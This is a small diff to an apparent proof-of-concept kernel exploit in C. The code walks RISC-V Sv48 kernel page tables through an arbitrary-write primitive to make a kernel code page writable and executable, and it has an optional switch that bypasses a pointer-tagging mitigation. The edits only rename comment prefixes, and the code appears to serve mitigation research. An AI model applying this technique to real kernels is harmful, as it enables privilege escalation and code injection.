@@ -1,4 +1,4 @@
-// FZY: Proof of concept that follows init_mm.pgd to walk the RISC-V Sv48 kernel
+// SDP: Proof of concept that follows init_mm.pgd to walk the RISC-V Sv48 kernel
 // page table (PGD -> PUD -> PMD -> PTE) down to the leaf entry of a kernel code
 // page, then flips its permission bits from read-execute to read-write-execute.
 //
@@ -60,7 +60,7 @@ struct arb_request {
 #define SDP_PT_POOL_MB 256
 #define SDP_PT_POOL_SIZE ((unsigned long)SDP_PT_POOL_MB << 20)
 
-// FZY: A plain load of a __tag1 slot returns the pointer with its upper 16
+// A plain load of a __tag1 slot returns the pointer with its upper 16
 // bits cleared. Restoring the kernel VA prefix bypasses the mitigation, so set
 // this to 1 only to evaluate whether the rest of the steps work; at 0 (the
 // default) the walk fails on the protected pointer, which is the point.
@@ -98,7 +98,7 @@ static void arb_write(int fd, unsigned long addr, void *data, size_t size) {
   }
 }
 
-// FZY: Undo the masking a plain load applies to a __tag1 slot
+// Undo the masking a plain load applies to a __tag1 slot
 static unsigned long untag(unsigned long val) {
 #if SDP_BYPASS_TAG
   return val | 0xFFFF000000000000UL;
